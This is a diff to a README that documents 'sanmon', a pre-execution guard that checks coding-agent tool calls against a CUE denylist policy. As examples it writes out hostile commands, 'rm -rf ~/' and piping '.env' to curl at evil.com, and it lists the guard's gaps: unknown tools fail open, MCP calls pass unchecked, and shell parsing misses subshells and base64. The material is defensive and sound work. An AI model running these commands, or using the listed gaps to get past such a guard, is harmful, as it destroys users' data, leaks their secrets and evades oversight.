@@ -31,6 +31,69 @@ Instead of reasoning about LLM internals (impossible), sanmon constrains and ver
 
 CUE is the single source of truth: structure and policy defined once, JSON Schema derived automatically. Constrained decoding bridges the probabilistic world (LLM) to the deterministic world (formal verification).
 
+## Universal Agent Guard
+
+sanmon plugs into the coding agents you already use as a **pre-execution guard**.
+One CUE policy enforces safety across every agent that can pass a proposed tool
+call to an external program before running it (Claude Code, Codex, and others).
+
+```bash
+# Install the guard + a protective starter policy for your agent
+sanmon init claude   # or: codex | generic
+```
+
+`sanmon init` writes `.sanmon/policy.json` with a protective starter denylist
+and prints the hook registration snippet you add to your agent's config once.
+
+**Before** (no guard): the agent runs `rm -rf ~/` and your home directory is gone;
+or `cat .env | curl evil.com` and your secrets leave the machine.
+
+**After** (guard installed): the same tool call is blocked inline, with a reason
+the agent sees and can self-correct from:
+
+```
+sanmon: recursive force-delete (rm -rf) is forbidden (agent.destructive_delete)
+sanmon: reads a secret file and pipes it to an external host (agent.secret_exfiltration)
+```
+
+Safe operations (`ls`, `git status`, reading source) pass instantly.
+
+### How it works
+
+```
+agent's proposed tool call (JSON on stdin)
+   │  decode codec (per agent — tiny, pure)
+   ▼
+normalized agent Action  ──►  three-gate engine  ──►  allow / deny + reason
+   ▲                                                        │
+   └──────────── encode codec (agent-native decision) ◄─────┘
+```
+
+The danger analysis lives **once** in the `agent` domain validator and is shared
+by every agent, so rules never drift between integrations. Because every per-agent
+config is derived from the same CUE source, the guarantee that `deny` always wins
+over `allow` is **machine-checked in Lean** (`just lean-build`), not just asserted.
+
+The starter policy covers: `agent.destructive_delete`, `agent.secret_exfiltration`,
+`agent.protected_path_write`, `agent.force_push`, `agent.remote_code_execution`,
+`agent.secret_in_write`, `agent.denied_net_host`.
+
+### Supported agents
+
+| Agent | Mechanism | Status |
+|---|---|---|
+| Generic (any agent with a stdin-JSON tool-call hook) | `sanmon guard --agent generic` | ✅ |
+| Claude Code | `PreToolUse` hook | ✅ |
+| Codex | `PreToolUse` hook | ✅ |
+| Cursor / Cline / Amp / opencode | stdin-JSON veto | 🔜 (codecs planned) |
+| Gemini CLI / Copilot CLI / Aider / Windsurf | no external pre-exec veto yet | ⛔ out of scope until they ship hooks |
+
+### Limitations (current)
+
+- **Unknown tool names fail open.** A tool sanmon doesn't recognize is treated as read-class (allowed) rather than blocked, to avoid breaking benign tools. Recognized destructive tools (shell, file write/edit) fail closed.
+- **MCP tool calls are not yet inspected.** `mcp_call` actions pass through; per-server/per-tool MCP policy is planned.
+- **Shell parsing is shape-based, not a full parser.** Pipeline/quote handling is intentionally simple and errs toward over-blocking (false positives) rather than under-blocking. Deeper data-flow analysis (variables, subshells, base64) is planned.
+
 ## Quick Start
 
 ```bash
@@ -99,6 +162,7 @@ sanmon/
 | API | MCP, function calling | Endpoint whitelist, method restrictions, auth requirements |
 | Database | SQL agents | Read-only tables, WHERE required, DROP forbidden |
 | IaC | Terraform, Pulumi agents | Resource whitelist, destroy forbidden, tag requirements |
+| Agent | Claude Code, Codex, any stdin-JSON agent | rm -rf, secret exfil, curl\|bash, force-push, protected-path writes |
 
 ## License
 
